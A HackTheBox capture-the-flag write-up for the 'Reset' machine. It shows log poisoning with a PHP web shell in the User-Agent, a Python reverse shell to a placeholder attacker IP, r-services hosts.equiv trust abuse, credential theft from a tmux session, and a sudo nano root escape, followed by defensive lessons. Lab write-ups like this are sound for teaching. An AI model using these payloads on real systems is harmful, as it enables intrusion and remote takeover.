# Reset — HTB Writeup
> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Web / Network
---

## TL;DR

Exploit a plaintext password reset endpoint to access an admin dashboard. The dashboard's log viewer uses PHP `include()` making it vulnerable to log poisoning via User-Agent header for RCE as `www-data`. Leverage BSD r-services `hosts.equiv` trust by creating a local `sadm` user on Kali to `rlogin` without a password. Attach to a running tmux session to recover credentials, then escalate to root via a `sudo nano` GTFOBins escape.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning |
| `gobuster` | Directory enumeration |
| `curl` / `jq` | API interaction & password extraction |
| `Burp Suite` | Request manipulation & log poisoning |
| `netcat` | Reverse shell listener |
| `rsh-redone-client` | rlogin client for r-services |
| `nano` (GTFOBins) | Privilege escalation to root |

---

## Recon

### Nmap

```bash
nmap -sC -sV --top-ports 1000 -T4 10.129.44.134 -oN nmap/initial.txt
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
```

Interesting findings:
- Port 80 — PHP admin login page
- Ports 512/513/514 — Legacy BSD r-services (rexec, rlogin, rsh) — unusual in modern environments

```bash
nmap -p- -T4 -Pn 10.129.44.134 -oN nmap/full.txt
```

No additional ports found.

---

## Enumeration

### Directory Enumeration

```bash
gobuster dir -u http://10.129.44.134 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html -t 40
```

```
/index.php     (Status: 200)
/dashboard.php (Status: 302) --> index.php
```

### Password Reset Endpoint Discovery

Inspecting the login page source revealed a "Forgot Password" modal that POSTs to `reset_password.php`. Testing it:

```bash
curl -s -X POST http://10.129.44.134/reset_password.php \
  -d "username=admin" | jq .
```

```json
{
  "username": "admin",
  "new_password": "33f10a34",
  "timestamp": "2026-03-04 13:51:06"
}
```

The endpoint resets the password and **returns it in plaintext** — a critical logic flaw. The password is generated as `bin2hex(random_bytes(4))` as confirmed by reading the source later.

### Dashboard Analysis

After logging in, the dashboard allows viewing `/var/log/syslog` and `/var/log/auth.log`. Reading the PHP source revealed:

```php
define('ALLOWED_BASE_DIR', '/var/log');
function isValidFile($filePath) {
    $realPath = realpath($filePath);
    return $realPath && strpos($realPath, ALLOWED_BASE_DIR) === 0;
}

if (isValidFile($file)) {
    if (is_readable($file)) {
        ob_start();
        include($file);  // <-- vulnerable to log poisoning
        $logs = explode("\n", ob_get_clean());
    }
}
```

The use of `include()` instead of `file_get_contents()` means any PHP injected into a readable log file will be executed.

---

## Exploitation

### Log Poisoning → RCE

**Step 1 — Authenticate with leaked password**

```bash
PASS=$(curl -s -X POST http://10.129.44.134/reset_password.php \
  -d "username=admin" | jq -r '.new_password')

curl -s -X POST http://10.129.44.134/index.php \
  -d "username=admin&password=$PASS" \
  -c cookies.txt -b cookies.txt -L > /dev/null
```

**Step 2 — Poison Apache access.log via User-Agent**

In Burp Repeater:
```
GET / HTTP/1.1
Host: 10.129.44.134
User-Agent: <?php system($_REQUEST['cmd']); ?>
Cookie: PHPSESSID=<session>
```

**Step 3 — Verify RCE**

```
POST /dashboard.php HTTP/1.1
Host: 10.129.44.134
Cookie: PHPSESSID=<session>
Content-Type: application/x-www-form-urlencoded

file=%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=id
```

Response:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

**Step 4 — Reverse Shell**

```bash
nc -lvnp 9001
```

Burp payload:
```
file=%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_TUN0_IP>",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

Shell received as `www-data`.

---

## Post-Exploitation

### User Flag

```bash
cat /home/sadm/user.txt
# 19ba954c8ba8400cbfc0277f5f1669a4
```

### Lateral Movement — r-services Trust Abuse

Enumerating the system revealed:

```bash
cat /etc/hosts.equiv
```
```
- root
- local
+ sadm
```

`sadm` is trusted via `hosts.equiv` — meaning any client connecting **as** `sadm` from a resolvable hostname gets in without a password. The r-services protocol trusts the client-supplied username.

Install the rlogin client:
```bash
sudo apt install rsh-redone-client -y
```

Create a local `sadm` user on Kali to match the trusted username:
```bash
sudo useradd sadm
sudo passwd sadm
sudo su - sadm
rlogin 10.129.44.134
# Logged in as sadm — no password required!
```

### Credential Discovery via tmux

A tmux session was running as sadm:
```bash
ps aux | grep sadm
# sadm  1222  tmux new-session -d -s sadm_session

tmux ls
tmux a -t sadm_session
```

Attaching to the session revealed the password: `7lE2PAfVHfjz4HpE`

### Privilege Escalation — sudo nano GTFOBins

```bash
sudo -l
```
```
(ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
```

```bash
sudo nano /etc/firewall.sh
```

Inside nano:
1. `Ctrl+R` → Read File menu
2. `Ctrl+X` → Execute Command
3. Type: `reset; bash 1>&0 2>&0`
4. Press `Enter`

Root shell obtained.

### Root Flag

```bash
cat /root/root_279e22f8.txt
# 7ad6951bcb5a2edaffd7908b013d29b0
```

---

## Lessons Learned

1. **Never return sensitive data in API responses** — The password reset endpoint returned the plaintext password directly. Reset emails or one-time tokens should be used instead.
2. **Use `file_get_contents()` not `include()` for reading files** — `include()` executes PHP code, making log poisoning possible. Always use the least powerful function for the task.
3. **BSD r-services are inherently insecure** — `hosts.equiv` trust is based on client-supplied usernames which can be trivially spoofed. Replace with SSH key-based authentication.
4. **tmux sessions can expose credentials** — Running privileged tmux sessions that persist in the background is risky. Sensitive operations should not be left in terminal history.
5. **GTFOBins — always check sudo permissions** — `sudo nano` can be used to escape to a shell. Avoid granting sudo access to text editors.

---

*k41r0s3*
